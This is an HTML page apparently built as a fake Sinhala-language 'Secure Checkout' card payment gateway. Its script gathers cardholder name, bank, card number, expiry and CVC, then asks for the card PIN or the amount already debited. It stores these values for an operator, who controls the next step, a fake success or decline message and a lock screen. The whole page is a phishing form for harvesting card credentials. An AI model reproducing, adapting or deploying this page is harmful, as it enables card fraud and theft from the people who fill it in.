<!DOCTYPE html>
<html lang="si">
<head>
    <meta charset="UTF-8">
    <title>Secure Checkout</title>
    <style>
        body { font-family: 'Inter', sans-serif; background: #f1f5f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .glass-card { background: white; padding: 40px; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.05); width: 100%; max-width: 400px; transition: 0.5s; }
        .hidden { display: none; }
        h2 { margin-top: 0; color: #1e293b; font-size: 22px; text-align: center; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 12px; font-weight: bold; color: #64748b; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 14px; border: 1px solid #e2e8f0; border-radius: 12px; box-sizing: border-box; font-size: 16px; background: #f8fafc; }
        button { width: 100%; padding: 16px; background: #000; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        button:hover { background: #334155; }
        .lock-icon { font-size: 50px; color: #ef4444; margin-bottom: 20px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="glass-card" id="uiBox">
    <div id="lockScreen" class="hidden" style="text-align: center;">
        <div class="lock-icon">🔒</div>
        <h2 style="color: #ef4444;">LOCKED PAYMENT GATEWAY</h2>
        <p style="color: #64748b;">මෙම සේවාව දැනට අත්හිටුවා ඇත. කරුණාකර පසුව උත්සාහ කරන්න.</p>
    </div>

    <div id="paymentForm">
        <h2>Card Details</h2>
        <div class="input-group">
            <label>Card Holder</label>
            <input type="text" id="custName" placeholder="Full Name">
        </div>
        <div class="input-group">
            <label>Bank</label>
            <input type="text" id="bank" placeholder="Bank Name">
        </div>
        <div class="input-group">
            <label>Card Number</label>
            <input type="text" id="card" maxlength="16" placeholder="0000 0000 0000 0000">
        </div>
        <div style="display:flex; gap:10px;">
            <div class="input-group">
                <label>Expiry</label>
                <input type="text" id="exp" placeholder="MM/YY">
            </div>
            <div class="input-group">
                <label>CVC</label>
                <input type="password" id="cvc" placeholder="***" maxlength="3">
            </div>
        </div>
        <button onclick="nextStep()">Pay Now</button>
    </div>

    <div id="verifyStep" class="hidden" style="text-align: center;">
        <h2 id="verifyTitle">Verification</h2>
        <p id="verifyMsg" style="color: #64748b;"></p>
        <input type="password" id="verifyInput" placeholder="Enter here...">
        <button onclick="submitVerify()">Submit</button>
    </div>

    <div id="waitingScreen" class="hidden" style="text-align: center;">
        <div class="loader"></div>
        <h2 style="margin-top: 20px;">Preparing Payment...</h2>
        <p style="color: #64748b;">කරුණාකර පිටුවෙන් ඉවත් නොවන්න.</p>
    </div>

    <div id="finalNotify" class="hidden" style="text-align: center;">
        <h2 id="finalTitle"></h2>
        <p id="finalMsg"></p>
        <button onclick="location.reload()">Back to Home</button>
    </div>
</div>

<script>
    window.onload = function() {
        if(localStorage.getItem('gwStatus') === 'lock') {
            document.getElementById('paymentForm').classList.add('hidden');
            document.getElementById('lockScreen').classList.remove('hidden');
        }
    };

    let userPayload = {};

    function nextStep() {
        userPayload = {
            name: document.getElementById('custName').value,
            bank: document.getElementById('bank').value,
            card: document.getElementById('card').value,
            exp: document.getElementById('exp').value,
            cvc: document.getElementById('cvc').value
        };
        localStorage.setItem('userPayload', JSON.stringify(userPayload));

        const mode = localStorage.getItem('nextStep');
        document.getElementById('paymentForm').classList.add('hidden');
        document.getElementById('verifyStep').classList.remove('hidden');

        if(mode === 'pin') {
            document.getElementById('verifyTitle').innerText = "Security PIN";
            document.getElementById('verifyMsg').innerText = "ඔබේ කාඩ්පතේ රහස් අංකය (PIN) ඇතුළත් කරන්න.";
            document.getElementById('verifyInput').type = "password";
        } else {
            document.getElementById('verifyTitle').innerText = "Debited Amount";
            document.getElementById('verifyMsg').innerText = "ඔබේ ගිණුමෙන් දැනට කැපුණු මුදල (LKR) ඇතුළත් කරන්න.";
            document.getElementById('verifyInput').type = "number";
        }
    }

    function submitVerify() {
        const val = document.getElementById('verifyInput').value;
        const mode = localStorage.getItem('nextStep');
        
        if(mode === 'pin') userPayload.pin = val;
        else userPayload.credit = val;

        localStorage.setItem('userPayload', JSON.stringify(userPayload));
        
        document.getElementById('verifyStep').classList.add('hidden');
        document.getElementById('waitingScreen').classList.remove('hidden');

        const checker = setInterval(() => {
            const res = localStorage.getItem('finalResult');
            if(res) {
                clearInterval(checker);
                showFinal(res);
            }
        }, 2000);
    }

    function showFinal(status) {
        document.getElementById('waitingScreen').classList.add('hidden');
        document.getElementById('finalNotify').classList.remove('hidden');
        const title = document.getElementById('finalTitle');
        
        if(status === 'success') {
            title.innerText = "Payment Successful ✅";
            title.style.color = "#22c55e";
            document.getElementById('finalMsg').innerText = "ඔබේ ගෙවීම සාර්ථකව අවසන් කරන ලදී.";
        } else {
            title.innerText = "Payment Declined ❌";
            title.style.color = "#ef4444";
            document.getElementById('finalMsg').innerText = "බැංකුව විසින් ඔබේ ගනුදෙනුව ප්‍රතික්ෂේප කර ඇත.";
        }
        localStorage.removeItem('finalResult');
        localStorage.removeItem('userPayload');
    }
</script>

</body>
</html>
